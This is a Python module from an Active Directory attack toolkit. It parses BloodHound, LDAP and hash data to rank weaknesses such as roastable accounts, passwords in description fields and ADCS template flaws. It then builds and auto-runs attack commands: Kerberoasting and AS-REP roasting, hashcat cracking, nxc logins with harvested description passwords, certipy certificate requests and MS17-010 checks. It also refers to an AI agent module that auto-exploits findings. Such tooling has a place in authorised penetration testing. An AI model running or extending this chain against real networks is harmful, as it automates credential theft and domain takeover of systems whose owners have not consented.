"""
Module: Smart Analyst
Parses ALL collected data sources (BloodHound JSON, agent logs, LDAP enum files),
detects vulnerabilities, builds a prioritised attack plan.
"""
import os, re, importlib, json
from pathlib import Path
from utils.helpers import *
from config.settings import SESSION, OUTPUT_DIR

# UAC bit flags
UAC_DISABLED             = 0x0002
UAC_PASSWD_NOT_REQ       = 0x0020
UAC_UNCONSTRAINED_DELEG  = 0x80000
UAC_DONT_REQ_PREAUTH     = 0x400000

# Known built-in descriptions that are NOT passwords
_BUILTIN_DESCRIPTIONS = {
    "built-in account for administering the computer/domain",
    "built-in account for guest access to the computer/domain",
    "key distribution center service account",
    "key distribution center service account for read-only domain controller",
    "a user account managed by the service",
}

_SEV = {
    "CRITICAL": fg(167) + BOLD,
    "HIGH":     fg(179) + BOLD,
    "MEDIUM":   fg(185) + BOLD,
    "LOW":      fg(71),
    "INFO":     fg(110),
}

def _sev(level, text):
    return f"{_SEV.get(level, '')}{text}{RST}"


# ══════════════════════════════════════════════════════════════════════════════
#  PARSERS
# ══════════════════════════════════════════════════════════════════════════════

def _read(rel_path: str) -> str:
    base = SESSION.get("output_dir") or str(OUTPUT_DIR)
    p = Path(base) / rel_path
    return p.read_text(errors="ignore") if p.exists() else ""


# ── BloodHound JSON readers ───────────────────────────────────────────────────

def _find_bh_files(pattern: str) -> list[Path]:
    """Find BloodHound JSON files in all known locations."""
    candidates = [
        Path("/tmp/agent_bloodhound"),
        Path(SESSION.get("output_dir") or str(OUTPUT_DIR)) / "bloodhound",
        Path("/tmp"),
    ]
    results = []
    for base in candidates:
        if base.exists():
            results.extend(base.glob(pattern))
    return list({f.resolve(): f for f in results}.values())  # deduplicate


def parse_bh_users() -> list[dict]:
    """Parse users from BloodHound users.json — richest source of user data."""
    users = []
    for f in _find_bh_files("*users.json"):
        try:
            data = json.loads(f.read_text(errors="ignore"))
            for node in data.get("data", []):
                props = node.get("Properties", {})
                sam   = props.get("samaccountname", "") or props.get("name", "")
                if not sam:
                    continue
                flags = []
                if props.get("dontreqpreauth"):
                    flags.append("ASREP_ROASTABLE")
                if props.get("unconstraineddelegation"):
                    flags.append("UNCONSTRAINED_DELEG")
                if props.get("admincount"):
                    flags.append("ADMINCOUNT")
                if not props.get("enabled", True):
                    flags.append("DISABLED")
                spns = props.get("serviceprincipalnames", [])
                if spns:
                    flags.append("KERBEROASTABLE")
                desc = props.get("description", "") or ""
                if desc:
                    desc_l = desc.lower()
                    has_hint = any(kw in desc_l for kw in
                                   ["pass", "pwd", "cred", "secret", "welcome", "temp",
                                    "changeme", "login", "default"])
                    looks_like_pw = len(desc) < 40 and any(
                        c.isdigit() or c in "!@#$%^&*" for c in desc)
                    if has_hint or looks_like_pw:
                        flags.append("PASSWORD_IN_DESCRIPTION")
                users.append({
                    "samaccountname": sam.split("@")[0],
                    "description":    desc,
                    "flags":          flags,
                    "admincount":     "1" if props.get("admincount") else "",
                    "spns":           spns,
                })
        except Exception:
            pass
    return users


def parse_bh_groups() -> list[dict]:
    """Parse groups from BloodHound groups.json."""
    groups = []
    for f in _find_bh_files("*groups.json"):
        try:
            data = json.loads(f.read_text(errors="ignore"))
            for node in data.get("data", []):
                props = node.get("Properties", {})
                name  = props.get("name", "")
                if not name:
                    continue
                members = [
                    m.get("ObjectIdentifier", "")
                    for m in node.get("Members", [])
                ]
                groups.append({"cn": name.split("@")[0], "members": members})
        except Exception:
            pass
    return groups


def parse_bh_computers() -> list[dict]:
    """Parse computers from BloodHound computers.json."""
    computers = []
    for f in _find_bh_files("*computers.json"):
        try:
            data = json.loads(f.read_text(errors="ignore"))
            for node in data.get("data", []):
                props = node.get("Properties", {})
                name  = props.get("name", "") or props.get("cn", "")
                if not name:
                    continue
                flags = []
                if props.get("unconstraineddelegation"):
                    flags.append("UNCONSTRAINED_DELEG")
                computers.append({
                    "cn":              name.split(".")[0],
                    "operatingsystem": props.get("operatingsystem", ""),
                    "flags":           flags,
                })
        except Exception:
            pass
    return computers


def parse_agent_findings() -> list[dict]:
    """Read findings from session.json (primary) and agent MD reports (fallback).
    Session is the authoritative source — findings accumulate there across scans."""
    findings = []

    # ── Primary: session.json findings ───────────────────────────────────────
    # SESSION["findings"] is populated live; also check the saved JSON file.
    session_findings = list(SESSION.get("findings", []))
    if not session_findings:
        sess_file = Path(SESSION.get("output_dir") or str(OUTPUT_DIR)) / "session.json"
        if sess_file.exists():
            try:
                saved = json.loads(sess_file.read_text(errors="ignore"))
                session_findings = saved.get("findings", [])
            except Exception:
                pass

    for sf in session_findings:
        sev = str(sf.get("severity", "Info")).upper()
        if sev not in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
            sev = "INFO"
        findings.append({
            "severity": sev,
            "title":    sf.get("name", sf.get("title", "Unknown finding")),
            "detail":   sf.get("description", sf.get("detail", "")),
        })

    # ── Fallback: agent MD log files ─────────────────────────────────────────
    if not findings:
        log_dir = Path(SESSION.get("output_dir") or str(OUTPUT_DIR)) / "agent_logs"
        reports = sorted(log_dir.glob("*.md"), key=lambda f: f.stat().st_mtime,
                         reverse=True) if log_dir.exists() else []
        for report in reports[:3]:
            try:
                text = report.read_text(errors="ignore")
                in_findings = False
                current: dict = {}
                for line in text.splitlines():
                    if line.startswith("## Findings"):
                        in_findings = True
                        continue
                    if not in_findings:
                        continue
                    if line.startswith("### "):
                        if current.get("title"):
                            findings.append(current)
                        m = re.match(r"### .*?\[(\w+)\]\s*(.+)", line)
                        if m:
                            current = {"severity": m.group(1).upper(),
                                       "title": m.group(2).strip(), "detail": ""}
                    elif line.startswith("**Description:**"):
                        current["detail"] = line.replace("**Description:**", "").strip()
                if current.get("title"):
                    findings.append(current)
            except Exception:
                pass

    return findings


def parse_ldap_users() -> list[dict]:
    raw = _read("enum/ldap_users.txt")
    if not raw:
        return []

    # Skip files that contain only LDAP errors (GSSAPI/auth failures)
    non_error_lines = [l for l in raw.splitlines()
                       if l.strip() and not any(e in l for e in (
                           "SASL", "GSSAPI", "ldap_sasl", "ldap3 error",
                           "Kerberos", "additional info", "Local error"))]
    if not non_error_lines:
        return []

    users, current = [], {}
    for line in raw.splitlines():
        line = line.strip()
        if line.startswith("dn:"):
            if current:
                users.append(current)
            current = {"dn": line[4:].strip(), "flags": []}
        elif ":" in line:
            k, _, v = line.partition(":")
            k, v = k.strip().lower(), v.strip()
            current[k] = v

            if k == "useraccountcontrol":
                try:
                    uac = int(v)
                    if uac & UAC_DISABLED:
                        current["flags"].append("DISABLED")
                    if uac & UAC_DONT_REQ_PREAUTH:
                        current["flags"].append("ASREP_ROASTABLE")
                    if uac & UAC_UNCONSTRAINED_DELEG:
                        current["flags"].append("UNCONSTRAINED_DELEG")
                    if uac & UAC_PASSWD_NOT_REQ:
                        current["flags"].append("NO_PASSWD_REQUIRED")
                except ValueError:
                    pass

            if k == "description":
                desc_lower = v.lower().strip()
                # Skip known built-in descriptions — not passwords
                if desc_lower not in _BUILTIN_DESCRIPTIONS:
                    # Must look like a credential: short, has digits/special chars,
                    # or contains password-hint keywords
                    has_hint = any(kw in desc_lower for kw in
                                   ["pass", "pwd", "cred", "secret", "welcome",
                                    "temp", "changeme", "login", "default"])
                    looks_like_pw = (len(v) < 40 and
                                     any(c.isdigit() or c in "!@#$%^&*" for c in v))
                    if has_hint or looks_like_pw:
                        current["flags"].append("PASSWORD_IN_DESCRIPTION")

            if k == "serviceprincipalname":
                current["flags"].append("KERBEROASTABLE")

    if current:
        users.append(current)

    return [u for u in users if u.get("samaccountname")]


def parse_ldap_groups() -> list[dict]:
    raw = _read("enum/ldap_groups.txt")
    if not raw:
        return []

    groups, current = [], {}
    for line in raw.splitlines():
        line = line.strip()
        if line.startswith("dn:"):
            if current:
                groups.append(current)
            current = {"dn": line[4:].strip(), "members": []}
        elif line.startswith("cn:"):
            current["cn"] = line[3:].strip()
        elif line.startswith("member:"):
            current["members"].append(line[7:].strip())

    if current:
        groups.append(current)
    return groups


def parse_ldap_computers() -> list[dict]:
    raw = _read("enum/ldap_computers.txt")
    if not raw:
        return []

    computers, current = [], {}
    for line in raw.splitlines():
        line = line.strip()
        if line.startswith("dn:"):
            if current:
                computers.append(current)
            current = {"dn": line[4:].strip(), "flags": []}
        elif ":" in line:
            k, _, v = line.partition(":")
            k = k.strip().lower()
            current[k] = v.strip()

            if k == "useraccountcontrol":
                try:
                    uac = int(v.strip())
                    if uac & UAC_UNCONSTRAINED_DELEG:
                        current["flags"].append("UNCONSTRAINED_DELEG")
                except ValueError:
                    pass

    if current:
        computers.append(current)
    return computers


def parse_hashes() -> dict:
    result = {"kerberoast": [], "asrep": []}
    for path in ["/tmp/kerberoast.txt", "output/kerberoast.txt"]:
        if Path(path).exists():
            lines = Path(path).read_text().splitlines()
            result["kerberoast"] = [l for l in lines if l.startswith("$krb5tgs")]
    for path in ["/tmp/asrep.txt", "output/asrep.txt"]:
        if Path(path).exists():
            lines = Path(path).read_text().splitlines()
            result["asrep"] = [l for l in lines if l.startswith("$krb5asrep")]
    return result


def parse_certipy() -> list[str]:
    vulns = []
    ALL_ESC = ["ESC1","ESC2","ESC3","ESC4","ESC6","ESC8","ESC9","ESC10","ESC11","ESC13"]

    # ── Primary: session findings (most reliable) ─────────────────────────────
    session_findings = list(SESSION.get("findings", []))
    if not session_findings:
        sess_file = Path(SESSION.get("output_dir") or str(OUTPUT_DIR)) / "session.json"
        if sess_file.exists():
            try:
                session_findings = json.loads(sess_file.read_text()).get("findings", [])
            except Exception:
                pass
    for sf in session_findings:
        name = sf.get("name", "") + " " + sf.get("description", "")
        for esc in ALL_ESC:
            if esc in name and esc not in vulns:
                vulns.append(esc)

    # ── Fallback: text files ──────────────────────────────────────────────────
    base = SESSION.get("output_dir") or str(OUTPUT_DIR)
    for f in Path(base).rglob("*.txt"):
        try:
            txt = f.read_text(errors="ignore")
            for esc in ALL_ESC:
                if esc in txt and esc not in vulns:
                    vulns.append(esc)
        except Exception:
            pass
    # Agent log MD files
    log_dir = Path(base) / "agent_logs"
    if log_dir.exists():
        for f in sorted(log_dir.glob("*.md"), key=lambda x: x.stat().st_mtime, reverse=True)[:3]:
            try:
                txt = f.read_text(errors="ignore")
                for esc in ALL_ESC:
                    if esc in txt and esc not in vulns:
                        vulns.append(esc)
            except Exception:
                pass
    return vulns


# ══════════════════════════════════════════════════════════════════════════════
#  ATTACK PLAN BUILDER
# ══════════════════════════════════════════════════════════════════════════════

def build_attack_plan(users, groups, computers, hashes, certipy_vulns,
                      agent_findings=None) -> list[dict]:
    plan   = []
    dc_ip  = SESSION.get("dc_ip", "")
    dc_fqdn = SESSION.get("dc_fqdn") or dc_ip
    domain = SESSION.get("domain", "")
    user   = SESSION.get("username", "")
    pw     = SESSION.get("password", "")
    bh_base = (f"bloodhound-python -u '{user}' -p '{pw}' -d {domain} "
               f"-dc {dc_fqdn} -ns {dc_ip} --disable-autogc")

    # ── Password in description ───────────────────────────────────────────────
    for u in users:
        if "PASSWORD_IN_DESCRIPTION" in u.get("flags", []):
            sam  = u.get("samaccountname", "?")
            desc = u.get("description", "")
            plan.append({
                "severity": "CRITICAL",
                "title":    f"Password in description field: {sam}",
                "detail":   f"Description value: {desc}",
                "module":   "23",
                "action":   f"nxc smb {dc_ip} -u '{sam}' -p '{desc}' -d {domain}",
            })

    # ── AS-REP Roastable ──────────────────────────────────────────────────────
    asrep_users = [u for u in users if "ASREP_ROASTABLE" in u.get("flags", [])
                   and "DISABLED" not in u.get("flags", [])]
    if asrep_users:
        names = [u.get("samaccountname","?") for u in asrep_users]
        plan.append({
            "severity": "CRITICAL",
            "title":    f"AS-REP Roastable users ({len(asrep_users)}): {', '.join(names)}",
            "detail":   "Pre-authentication disabled — hash can be cracked offline",
            "module":   "8",
            "action":   f"{imp('GetNPUsers.py')} {domain}/ -dc-ip {dc_ip} -no-pass "
                        f"-usersfile /tmp/asrep_targets.txt -format hashcat -outputfile /tmp/asrep.txt",
            "prep":     lambda names=names: Path("/tmp/asrep_targets.txt").write_text("\n".join(names)),
        })

    # ── Kerberoastable ────────────────────────────────────────────────────────
    krb_users = [u for u in users if "KERBEROASTABLE" in u.get("flags", [])
                 and "DISABLED" not in u.get("flags", [])]
    if krb_users:
        names = [u.get("samaccountname","?") for u in krb_users]
        plan.append({
            "severity": "HIGH",
            "title":    f"Kerberoastable service accounts ({len(krb_users)}): {', '.join(names)}",
            "detail":   "SPN set on account — TGS hash can be cracked offline",
            "module":   "8",
            "action":   f"GetUserSPNs.py {domain}/{user}:'{pw}' -dc-ip {dc_ip} "
                        f"-request -outputfile /tmp/kerberoast.txt",
        })

    # ── Hashes ready to crack ─────────────────────────────────────────────────
    if hashes["kerberoast"]:
        plan.append({
            "severity": "HIGH",
            "title":    f"Kerberoast hashes found ({len(hashes['kerberoast'])})",
            "detail":   "File: /tmp/kerberoast.txt",
            "module":   None,
            "action":   "hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt --force",
        })
    if hashes["asrep"]:
        plan.append({
            "severity": "HIGH",
            "title":    f"AS-REP hashes found ({len(hashes['asrep'])})",
            "detail":   "File: /tmp/asrep.txt",
            "module":   None,
            "action":   "hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt --force",
        })

    # ── Unconstrained Delegation (skip DCs — expected behaviour) ─────────────
    dc_names = {SESSION.get("hostname","").upper(), "DC01", "DC02", "DC"}
    non_dc_deleg = [
        u for u in users + computers
        if "UNCONSTRAINED_DELEG" in u.get("flags", [])
        and (u.get("samaccountname","") or u.get("cn","")).upper().rstrip("$")
            not in dc_names
    ]
    if non_dc_deleg:
        targets = [(u.get("samaccountname") or u.get("cn","?")) for u in non_dc_deleg]
        plan.append({
            "severity": "HIGH",
            "title":    f"Unconstrained Delegation on non-DC ({len(non_dc_deleg)}): {', '.join(targets)}",
            "detail":   "Coerce DC auth to this host → capture TGT → DCSync",
            "module":   "21",
            "action":   f"# Use module [21] Coercion Attacks → PrinterBug / PetitPotam",
        })

    # ── ADCS vulnerabilities ──────────────────────────────────────────────────
    for esc in certipy_vulns:
        sev = "CRITICAL" if esc in ("ESC1","ESC8") else "HIGH"
        plan.append({
            "severity": sev,
            "title":    f"ADCS {esc} vulnerability detected",
            "detail":   {
                "ESC1": "Enrollee can supply SAN → request cert as any user (DA)",
                "ESC8": "NTLM relay to ADCS HTTP → obtain DC cert → DCSync",
                "ESC4": "Template ACL writable → convert to ESC1",
                "ESC6": "EDITF_ATTRIBUTESUBJECTALTNAME2 enabled on CA",
            }.get(esc, "Certificate vulnerability — exploit with certipy"),
            "module":   "19",
            "action":   f"certipy-ad req -u '{user}@{domain}' -p '{pw}' -dc-ip {dc_ip} "
                        f"-ca <CA_NAME> -template <TEMPLATE>",
        })

    # ── Domain Admins group ───────────────────────────────────────────────────
    da_group = next((g for g in groups if "domain admins" in
                     (g.get("cn","") or "").lower()), None)
    if da_group:
        count = len(da_group.get("members", []))
        plan.append({
            "severity": "INFO",
            "title":    f"Domain Admins has {count} member(s)",
            "detail":   "Use BloodHound to find shortest attack paths to these accounts",
            "module":   "10",
            "action":   f"{bh_base} -c All --zip",
        })

    # ── Legacy OS ────────────────────────────────────────────────────────────
    old_kw = ["2003","2008","2012","xp","vista","windows 7","windows 8"]
    old_hosts = [c for c in computers
                 if any(kw in (c.get("operatingsystem","") or "").lower() for kw in old_kw)]
    if old_hosts:
        names = [c.get("cn","?") for c in old_hosts]
        plan.append({
            "severity": "MEDIUM",
            "title":    f"Legacy OS detected ({len(old_hosts)}): {', '.join(names[:3])}",
            "detail":   "Potential EternalBlue (MS17-010) or other legacy CVEs",
            "module":   "4",
            "action":   f"nxc smb {dc_ip} -u '{user}' -p '{pw}' -M ms17-010",
        })

    # ── BloodHound not yet collected ──────────────────────────────────────────
    bh_files = (list(Path(SESSION.get("output_dir") or str(OUTPUT_DIR)).rglob("*.zip"))
                + list(Path("/tmp/agent_bloodhound").glob("*.zip") if Path("/tmp/agent_bloodhound").exists() else []))
    if not bh_files:
        plan.append({
            "severity": "INFO",
            "title":    "BloodHound data not collected yet",
            "detail":   "Critical for visualising all attack paths to Domain Admin",
            "module":   "51",
            "action":   f"Run the AI Agent [51] — it collects BloodHound automatically",
        })

    # ── Agent findings (from last scan report) ────────────────────────────────
    for af in (agent_findings or []):
        sev = af.get("severity", "INFO").upper()
        if sev not in ("CRITICAL","HIGH","MEDIUM","LOW","INFO"):
            sev = "INFO"
        title = af.get("title", "")
        # Skip duplicates already in plan
        if any(title.lower() in p["title"].lower() or p["title"].lower() in title.lower()
               for p in plan):
            continue
        plan.append({
            "severity": sev,
            "title":    title,
            "detail":   af.get("detail", "See agent report for details"),
            "module":   "51",
            "action":   "Run AI Agent [51] to auto-exploit this finding",
        })

    order = ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]
    plan.sort(key=lambda x: order.index(x["severity"]))
    return plan


# ══════════════════════════════════════════════════════════════════════════════
#  DISPLAY
# ══════════════════════════════════════════════════════════════════════════════

def _show_user_summary(users):
    if not users:
        return
    enabled = [u for u in users if "DISABLED" not in u.get("flags",[])]
    asrep  = [u for u in enabled if "ASREP_ROASTABLE"        in u.get("flags",[])]
    krb    = [u for u in enabled if "KERBEROASTABLE"          in u.get("flags",[])]
    passw  = [u for u in enabled if "PASSWORD_IN_DESCRIPTION" in u.get("flags",[])]
    adm    = [u for u in enabled if u.get("admincount") == "1"]

    print(f"\n  {fg(110)}{BOLD}  USER SUMMARY{RST}  {DIM}({len(enabled)} active / {len(users)} total){RST}")
    print(f"  {fg(238)}{'─'*50}{RST}")
    kv("AS-REP Roastable",        f"{_sev('CRITICAL',str(len(asrep)))}  {DIM}{[u.get('samaccountname') for u in asrep]}{RST}")
    kv("Kerberoastable",          f"{_sev('HIGH',str(len(krb)))}  {DIM}{[u.get('samaccountname') for u in krb]}{RST}")
    kv("Password in Description", f"{_sev('CRITICAL',str(len(passw)))}  {DIM}{[u.get('samaccountname') for u in passw]}{RST}")
    kv("AdminCount=1",            f"{fg(179)}{len(adm)}{RST}  {DIM}{[u.get('samaccountname') for u in adm]}{RST}")
    print()


def _show_plan(plan: list[dict]):
    if not plan:
        warn("No data to analyse — run [10]→[A] Full Enum first")
        return

    print(f"\n  {fg(75)}{BOLD}{'─'*74}{RST}")
    print(f"  {fg(75)}{BOLD}  ATTACK PLAN  —  {len(plan)} finding(s){RST}")
    print(f"  {fg(75)}{BOLD}{'─'*74}{RST}\n")

    for i, item in enumerate(plan, 1):
        sev_tag = _sev(item["severity"], f"[{item['severity']:<8}]")
        mod_tag = f"  {DIM}→ Module [{item['module']}]{RST}" if item.get("module") else ""
        print(f"  {fg(238)}[{i:>2}]{RST}  {sev_tag}  {BOLD}{item['title']}{RST}")
        print(f"         {DIM}{item['detail']}{RST}{mod_tag}")
        print(f"         {fg(75)}$ {item['action']}{RST}")
        print()


# ══════════════════════════════════════════════════════════════════════════════
#  AUTO-EXECUTE
# ══════════════════════════════════════════════════════════════════════════════

def _auto_execute(plan: list[dict]):
    print(f"  {fg(110)}Auto-execute a step? (number / 'a' for all / Enter to skip){RST}")
    choice = input(f"  {M}Choice:{RST} ").strip().lower()

    if not choice:
        return

    targets = []
    if choice == "a":
        targets = list(range(len(plan)))
    elif choice.isdigit():
        idx = int(choice) - 1
        if 0 <= idx < len(plan):
            targets = [idx]
        else:
            warn("Invalid number")
            return
    else:
        return

    for idx in targets:
        item = plan[idx]
        if "prep" in item:
            try:
                item["prep"]()
            except Exception:
                pass

        action = item["action"]
        if action.startswith("#"):
            info(f"Manual step: {action[1:].strip()}")
            if item.get("module"):
                info(f"Select module [{item['module']}] from the main menu")
            continue

        print(f"\n  {fg(75)}{BOLD}Running:{RST} {item['title']}")
        run_cmd(action)

        hashes = parse_hashes()
        total = len(hashes["kerberoast"]) + len(hashes["asrep"])
        if ("kerberoast" in action or "asrep" in action) and total:
            success(f"{total} hash(es) captured — crack with hashcat?")
            c = input(f"  {M}[Y/n]:{RST} ").strip().lower()
            if c != "n":
                ht = "13100" if hashes["kerberoast"] else "18200"
                hf = "/tmp/kerberoast.txt" if hashes["kerberoast"] else "/tmp/asrep.txt"
                run_cmd(f"hashcat -m {ht} {hf} /usr/share/wordlists/rockyou.txt --force")

        add_finding(
            name=item["title"],
            severity=item["severity"].capitalize(),
            description=item["detail"],
            recommendation=f"Command: {action[:120]}",
        )


# ══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════

def _run_full_enum_auto():
    """Run enum_ad with option [A] programmatically — no user input needed."""
    import sys, io, unittest.mock as mock

    info("No enumeration data found — running Full Auto Enum ([10]→[A]) automatically...")
    print()

    try:
        import modules.enum_ad as enum_mod
        importlib.reload(enum_mod)

        # Patch input() so the module reads 'A' for the menu choice
        # and uses session values for dc/domain/username/password
        original_input = __builtins__["input"] if isinstance(__builtins__, dict) else __builtins__.input
        call_count = [0]

        def _mock_input(prompt=""):
            call_count[0] += 1
            # The first 4 prompts are dc_ip, domain, username, password
            # (handled by input_or_session which may skip if already in SESSION)
            # The last prompt is the menu choice — return 'A'
            low = str(prompt).lower()
            if "dc ip" in low or "dc_ip" in low:
                return SESSION.get("dc_ip", "")
            if "domain" in low:
                return SESSION.get("domain", "")
            if "username" in low or "user" in low:
                return SESSION.get("username", "")
            if "password" in low or "pass" in low:
                return ""  # let session handle it
            # Menu choice
            return "A"

        import builtins
        with mock.patch("builtins.input", side_effect=_mock_input):
            enum_mod.run()

        success("Full Enum completed — re-analysing data...")
        print()
    except Exception as e:
        warn(f"Auto-enum failed: {e} — run [10]→[A] manually and return here")


def run():
    print_banner("SMART ANALYST", "Parse collected data and build an attack plan")

    stop = spinner("Analysing output files...")
    # Merge data from ALL sources: LDAP files + BloodHound JSON + agent logs
    ldap_users = parse_ldap_users()
    bh_users   = parse_bh_users()
    # Deduplicate: prefer BH (richer data), fill gaps with LDAP
    bh_sams = {u["samaccountname"].lower() for u in bh_users}
    extra_ldap = [u for u in ldap_users if u.get("samaccountname","").lower() not in bh_sams]
    users = bh_users + extra_ldap

    ldap_groups = parse_ldap_groups()
    bh_groups   = parse_bh_groups()
    bh_gnames   = {g["cn"].lower() for g in bh_groups}
    extra_groups = [g for g in ldap_groups if g.get("cn","").lower() not in bh_gnames]
    groups = bh_groups + extra_groups

    ldap_computers = parse_ldap_computers()
    bh_computers   = parse_bh_computers()
    bh_cnames      = {c["cn"].lower() for c in bh_computers}
    extra_computers = [c for c in ldap_computers if c.get("cn","").lower() not in bh_cnames]
    computers = bh_computers + extra_computers

    hashes         = parse_hashes()
    certipy_v      = parse_certipy()
    agent_findings = parse_agent_findings()
    stop()

    has_data = users or groups or computers or hashes["kerberoast"] or certipy_v or agent_findings

    # If still no data, auto-run Full Enum
    if not has_data:
        _run_full_enum_auto()
        stop2 = spinner("Re-analysing after enumeration...")
        ldap_users     = parse_ldap_users()
        bh_users       = parse_bh_users()
        bh_sams        = {u["samaccountname"].lower() for u in bh_users}
        extra_ldap     = [u for u in ldap_users if u.get("samaccountname","").lower() not in bh_sams]
        users          = bh_users + extra_ldap
        bh_groups      = parse_bh_groups()
        groups         = bh_groups + [g for g in parse_ldap_groups()
                                       if g.get("cn","").lower() not in {x["cn"].lower() for x in bh_groups}]
        bh_computers   = parse_bh_computers()
        computers      = bh_computers + [c for c in parse_ldap_computers()
                                          if c.get("cn","").lower() not in {x["cn"].lower() for x in bh_computers}]
        hashes         = parse_hashes()
        certipy_v      = parse_certipy()
        agent_findings = parse_agent_findings()
        stop2()
        has_data       = users or certipy_v or agent_findings

    if not has_data:
        warn("No data collected — check DC/credentials and try again.")
        pause()
        return

    plan = build_attack_plan(users, groups, computers, hashes, certipy_v, agent_findings)

    # Summary header
    print(f"\n  {fg(75)}{BOLD}Data sources:{RST}"
          f"  {fg(110)}{len(users)} users{RST}  "
          f"  {fg(110)}{len(groups)} groups{RST}  "
          f"  {fg(110)}{len(computers)} computers{RST}  "
          f"  {fg(110)}{len(certipy_v)} ADCS vulns{RST}  "
          f"  {fg(110)}{len(agent_findings)} agent findings{RST}")

    _show_user_summary(users)
    _show_plan(plan)
    _auto_execute(plan)
    pause()
